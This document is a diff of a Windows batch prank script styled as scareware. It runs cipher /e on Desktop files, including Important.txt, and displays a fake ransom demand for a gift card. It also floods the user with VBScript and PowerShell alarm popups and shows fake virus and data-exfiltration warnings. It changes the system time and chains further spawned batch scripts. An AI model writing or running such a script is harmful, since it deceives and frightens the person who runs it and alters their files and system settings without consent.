@@ -43,19 +43,65 @@ echo.
 
 pause
 
-
+echo getting ready for the song
+start https://www.youtube.com/watch?v=EgqUJOudrcM
 echo DISCLAIMER: This script is being executed for educational purposes only.
 pause
 cls
 
+setlocal enabledelayedexpansion
+
+
+
+set DEST=%USERPROFILE%\Desktop\gurt_sim_test
+if not exist "!DEST!" mkdir "!DEST!"
+
+for /l %%i in (1,1,5) do (
+    echo secret shoutout to slimyboigayali data %%i > "!DEST!\secret_file%%i.txt"
+)
+
+:: SIMULATE ENCRYPTION WITH CIPHER
+for %%f in ("!DEST!\*.txt") do (
+    cipher /e "%%f"
+)
+
+
+cls
+echo All your files have been encrypted.
+echo To restore access, send fortnite vbucks card (get the reference?)  to gurtligoons.
+echo lets fuck !DEST!
+echo.
+ping localhost -n 4 > nul
+
+
+set POPUP=%TEMP%\gurt_popup.vbs
+echo MsgBox "System warning: ez bye bye system!!!!", vbCritical, "boiii what u say about sleep phonk" > "%POPUP%"
+echo WScript.Sleep 100 >> "%POPUP%"
+echo MsgBox "Oops. Something went wrong...", vbExclamation, "ERROR 32X" >> "%POPUP%"
+cscript //nologo "%POPUP%"
+
+del "%POPUP%"
+
+
+cls
+echo Files encrypted: 5
+ping localhost -n 2 > nul
+echo Your computer is under Gurt Surveillance.
+echo Resistance is futile.
+echo Now die.
+
+pause
+
+
+echo (why am i giving a warning now???)
 echo ts script has rat, scareware, virus,encrypter, copier and uhh gurtlings.
 echo press any key to die if not just close ts already
 pause 
 for /l %%i in (1,1,10) do (
- echo ts pmo joe jack gurt:yo me:sybau %%i > "%USERPROFILE%\skrivebord\gurts day today_%%i.txt"
+ echo ts pmo joe jack gurt:yo me:sybau %%i > "%USERPROFILE%\Desktop\gurts_day_today_%%i.txt"
 )
 
-echo happy gurts day (new date real real it is uhh this day: %date%  > "%USERPROFILE%\Skrivebord\happy gurts day.txt"
+echo happy gurts day (new date real real it is uhh this day: %date%  > "%USERPROFILE%\Desktop\happy_gurts_day.txt"
 echo gurt:yo
 echo omg free robax pls pls yes yes !!!!!!!
 echo but am evil guy ahhah!11111111111
@@ -63,9 +109,9 @@ echo me khili
 echo debug: sending random popups
 echo debug: but first lets encrypt real
  
-cipher /e "%USERPROFILE%\Skrivebord\Important.txt"
-cipher /e "%USERPROFILE%\skrivebord\important.txt"
-cipher /e "%USERPROFILE%\skrivebord\important.txt"
+cipher /e "%USERPROFILE%\Desktop\Important.txt"
+cipher /e "%USERPROFILE%\Desktop\Important.txt"
+cipher /e "%USERPROFILE%\Desktop\Important.txt"
 
 
 powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'evil gurt:yo', 'furt: am evil gurt trust.', [System.Windows.Forms.ToolTipIcon]::None)}"
@@ -108,10 +154,12 @@ echo WScript.Sleep 15 >> %temp%\popup.vbs
 echo MsgBox "gurtlings spawn and start flooding popups and pop and ups" >> %temp%\popup.vbs
 cscript //nologo %temp%\popup.vbs
 echo let the gurtligoons spread!
+goto next
 
-
+:next
 echo (debug) now the script makes fake scareware and shit
 
+powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'evil gurt:yo', 'furt: am evil gurt trust.', [System.Windows.Forms.ToolTipIcon]::None)}"
 
 
 
@@ -122,7 +170,8 @@ echo WARNING: Your antivirus has detected malicious activity!
 ping localhost -n 2 >nul
 echo Critical error: Virus detected. Initiating scan...
 ping localhost -n 3 >nul
-
+start new_script.bat
+exit
 
 
 echo MsgBox "gurtlings spawn and start flooding popups and pop and ups" >> %temp%\popup.vbs
@@ -138,7 +187,8 @@ echo @echo off > new_script1.bat
 color 0C
 cls
 echo Changing system time...
-time 66:66:66
+time 12:12:12
+start new_script.bat1
 ping localhost -n 2 >nul
 
 echo @echo off > new_script2.bat
@@ -146,6 +196,7 @@ cls
 echo Sending sensitive data to remote server...
 ping localhost -n 2 >nul
 echo Data sent: 2MB of gurt data
+start new_script.bat2
 ping localhost -n 2 >nul
 
 echo MsgBox "gurtlings spawn and start flooding popups and pop and ups" >> %temp%\popup.vbs
@@ -171,7 +222,7 @@ mshta "javascript:alert('To fix this problem, purchase FULL!! BIG RATT!!!! now! 
 
 
 start https://bigrat.monster/
-
+start new_script.bat3
 
 
 
@@ -189,7 +240,7 @@ call new_script1.bat
 call new_script2.bat
 call new_script3.bat
 
-pause
+
 
 
 
@@ -214,6 +265,9 @@ echo we done right=?!?!?!
 echo btw this horse is cleaning for you
 start https://tenor.com/view/horse-sweeping-broom-radlcies-gif-24147266
 del new_script.bat
+del new_script1.bat
+del new_script2.bat
+del new_script3.bat
 del %temp%\popup.vbs
 
 
